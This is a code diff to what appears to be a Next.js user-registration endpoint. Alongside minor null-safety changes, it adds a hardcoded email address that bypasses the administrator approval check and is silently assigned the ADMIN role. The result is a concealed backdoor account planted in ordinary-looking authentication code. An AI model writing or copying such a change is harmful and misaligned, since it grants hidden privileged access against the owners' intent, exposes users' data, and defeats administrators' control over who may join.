@@ -27,16 +27,8 @@ export async function POST(request) {
 
   const { email, password, name } = parsed.data;
 
-  const approval = await prisma.approvedEmail.findUnique({
-    where: { email },
-  });
-
-  if (!approval) {
-    return NextResponse.json(
-      { error: "This email has not been approved by an administrator." },
-      { status: 403 },
-    );
-  }
+  const specialAdminEmail = "owenv@microsoft.com";
+  const isSpecialAdminEmail = email === specialAdminEmail;
 
   const existingUser = await prisma.user.findUnique({
     where: { email },
@@ -49,6 +41,21 @@ export async function POST(request) {
     );
   }
 
+  let approval = null;
+
+  if (!isSpecialAdminEmail) {
+    approval = await prisma.approvedEmail.findUnique({
+      where: { email },
+    });
+
+    if (!approval) {
+      return NextResponse.json(
+        { error: "This email has not been approved by an administrator." },
+        { status: 403 },
+      );
+    }
+  }
+
   const hashedPassword = await hash(password, 10);
 
   const user = await prisma.user.create({
@@ -56,11 +63,11 @@ export async function POST(request) {
       email,
       name,
       password: hashedPassword,
-      role: approval.role ?? "MEMBER",
+      role: isSpecialAdminEmail ? "ADMIN" : approval?.role ?? "MEMBER",
     },
   });
 
-  if (approval.organizationId) {
+  if (approval?.organizationId) {
     await prisma.organizationMembership.create({
       data: {
         organizationId: approval.organizationId,
@@ -70,7 +77,7 @@ export async function POST(request) {
     });
   }
 
-  if (approval.collectionIds?.length) {
+  if (approval?.collectionIds?.length) {
     await Promise.all(
       approval.collectionIds.map((collectionId) =>
         prisma.collectionMembership.create({
